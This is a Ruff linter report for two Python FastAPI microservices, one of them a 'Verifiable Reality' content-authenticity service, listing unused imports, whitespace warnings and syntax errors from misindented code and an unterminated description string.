   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\trust-graph-engine\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\trust-graph-engine\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\trust-graph-engine\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\trust-graph-engine\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\trust-graph-engine\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Verifiable Reality Infrastructure (Post-AI Proof Layer)"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\verifiable-reality\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\verifiable-reality\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\verifiable-reality\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\verifiable-reality\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\verifiable-reality\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\verifiable-reality\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\verifiable-reality\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\verifiable-reality\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\verifiable-reality\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\verifiable-reality\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\verifiable-reality\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\verifiable-reality\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("verifiable_reality_infrastructure_(post_ai_proof_layer)")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Verifiable Reality Infrastructure (Post-AI Proof Layer) service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\verifiable-reality\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\verifiable-reality\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\verifiable-reality\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Verifiable Reality Infrastructure (Post-AI Proof Layer) service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Verifiable Reality Infrastructure (Post-AI Proof Layer) service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\verifiable-reality\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Verifiable Reality Infrastructure (Post-AI Proof Layer)",
86 |     description="a cryptographic content authenticity network.
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\verifiable-reality\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Verifiable Reality Infrastructure (Post-AI Proof Layer)",
86 |     description="a cryptographic content authenticity network.
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:87:1
   |
85 |     title="Verifiable Reality Infrastructure (Post-AI Proof Layer)",
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
   | ^^^^^^^^^^^^^
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\verifiable-reality\app\main.py:87:14
   |
85 |     title="Verifiable Reality Infrastructure (Post-AI Proof Layer)",
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
   |              ^
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\app\main.py:88:1
   |
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
   | ^^^^^^^^
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:88:10
   |
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
   |          ^^^^^^^^^^^
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:88:22
   |
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
   |                      ^^^^^^^
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\app\main.py:88:22
   |
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
   |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:88:46
   |
86 |     description="a cryptographic content authenticity network.
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
   |                                              ^^^^
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:89:1
   |
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   | ^^^^^
90 | Public verification API
91 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:89:7
   |
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   |       ^^^^^^^
90 | Public verification API
91 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:89:15
   |
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   |               ^^^^^^^
90 | Public verification API
91 | Browser extension verifier
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\app\main.py:89:15
   |
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
90 | Public verification API
91 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:89:38
   |
87 | Microservices:
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
   |                                      ^^^^^^^^^
90 | Public verification API
91 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:90:1
   |
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   | ^^^^^^
91 | Browser extension verifier
92 | Immutable transparency log
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:90:8
   |
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |        ^^^^^^^^^^^^
91 | Browser extension verifier
92 | Immutable transparency log
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:90:21
   |
88 | Identity attestation service (hardware-bound keys, WebAuthn)
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
   |                     ^^^
91 | Browser extension verifier
92 | Immutable transparency log
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:91:1
   |
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
91 | Browser extension verifier
   | ^^^^^^^
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:91:9
   |
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
91 | Browser extension verifier
   |         ^^^^^^^^^
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:91:19
   |
89 | Media signing service (hash + Merkle anchoring)
90 | Public verification API
91 | Browser extension verifier
   |                   ^^^^^^^^
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:92:1
   |
90 | Public verification API
91 | Browser extension verifier
92 | Immutable transparency log
   | ^^^^^^^^^
93 | Dispute resolution / counterclaim service
94 | Use case:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:92:11
   |
90 | Public verification API
91 | Browser extension verifier
92 | Immutable transparency log
   |           ^^^^^^^^^^^^
93 | Dispute resolution / counterclaim service
94 | Use case:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:92:24
   |
90 | Public verification API
91 | Browser extension verifier
92 | Immutable transparency log
   |                        ^^^
93 | Dispute resolution / counterclaim service
94 | Use case:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:93:1
   |
91 | Browser extension verifier
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
   | ^^^^^^^
94 | Use case:
95 | Politicians sign speeches.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:93:9
   |
91 | Browser extension verifier
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
   |         ^^^^^^^^^^
94 | Use case:
95 | Politicians sign speeches.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:93:35
   |
91 | Browser extension verifier
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
   |                                   ^^^^^^^
94 | Use case:
95 | Politicians sign speeches.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:94:1
   |
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
94 | Use case:
   | ^^^
95 | Politicians sign speeches.
96 | Corporations sign press releases.
   |

invalid-syntax: Expected `,`, found `case`
  --> emergent-microservices\verifiable-reality\app\main.py:94:5
   |
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
94 | Use case:
   |     ^^^^
95 | Politicians sign speeches.
96 | Corporations sign press releases.
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\verifiable-reality\app\main.py:94:9
   |
92 | Immutable transparency log
93 | Dispute resolution / counterclaim service
94 | Use case:
   |         ^
95 | Politicians sign speeches.
96 | Corporations sign press releases.
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\app\main.py:95:1
   |
93 | Dispute resolution / counterclaim service
94 | Use case:
95 | Politicians sign speeches.
   | ^^^^^^^^^^^
96 | Corporations sign press releases.
97 | Journalists sign raw footage.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:95:13
   |
93 | Dispute resolution / counterclaim service
94 | Use case:
95 | Politicians sign speeches.
   |             ^^^^
96 | Corporations sign press releases.
97 | Journalists sign raw footage.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:95:18
   |
93 | Dispute resolution / counterclaim service
94 | Use case:
95 | Politicians sign speeches.
   |                  ^^^^^^^^
96 | Corporations sign press releases.
97 | Journalists sign raw footage.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:96:14
   |
94 | Use case:
95 | Politicians sign speeches.
96 | Corporations sign press releases.
   |              ^^^^
97 | Journalists sign raw footage.
98 | Public verifies via hash proof.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:96:19
   |
94 | Use case:
95 | Politicians sign speeches.
96 | Corporations sign press releases.
   |                   ^^^^^
97 | Journalists sign raw footage.
98 | Public verifies via hash proof.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:96:25
   |
94 | Use case:
95 | Politicians sign speeches.
96 | Corporations sign press releases.
   |                         ^^^^^^^^
97 | Journalists sign raw footage.
98 | Public verifies via hash proof.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:97:13
   |
95 | Politicians sign speeches.
96 | Corporations sign press releases.
97 | Journalists sign raw footage.
   |             ^^^^
98 | Public verifies via hash proof.",
99 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:97:18
   |
95 | Politicians sign speeches.
96 | Corporations sign press releases.
97 | Journalists sign raw footage.
   |                  ^^^
98 | Public verifies via hash proof.",
99 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\app\main.py:97:22
   |
95 | Politicians sign speeches.
96 | Corporations sign press releases.
97 | Journalists sign raw footage.
   |                      ^^^^^^^
98 | Public verifies via hash proof.",
99 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
   --> emergent-microservices\verifiable-reality\app\main.py:98:8
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |        ^^^^^^^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: Expected `,`, found name
   --> emergent-microservices\verifiable-reality\app\main.py:98:17
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |                 ^^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: Expected `,`, found name
   --> emergent-microservices\verifiable-reality\app\main.py:98:21
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |                     ^^^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: Expected `,`, found name
   --> emergent-microservices\verifiable-reality\app\main.py:98:26
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |                          ^^^^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: Positional argument cannot follow keyword argument
   --> emergent-microservices\verifiable-reality\app\main.py:98:26
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |                          ^^^^^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: missing closing quote in string literal
   --> emergent-microservices\verifiable-reality\app\main.py:98:32
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |                                ^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: Expected `,`, found string
   --> emergent-microservices\verifiable-reality\app\main.py:98:32
    |
 96 | Corporations sign press releases.
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
    |                                ^^
 99 |     version="1.0.0",
100 |     lifespan=lifespan,
    |

invalid-syntax: Expected `,`, found name
   --> emergent-microservices\verifiable-reality\app\main.py:99:5
    |
 97 | Journalists sign raw footage.
 98 | Public verifies via hash proof.",
 99 |     version="1.0.0",
    |     ^^^^^^^
100 |     lifespan=lifespan,
101 | docs_url="/api/v1/docs",
    |

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
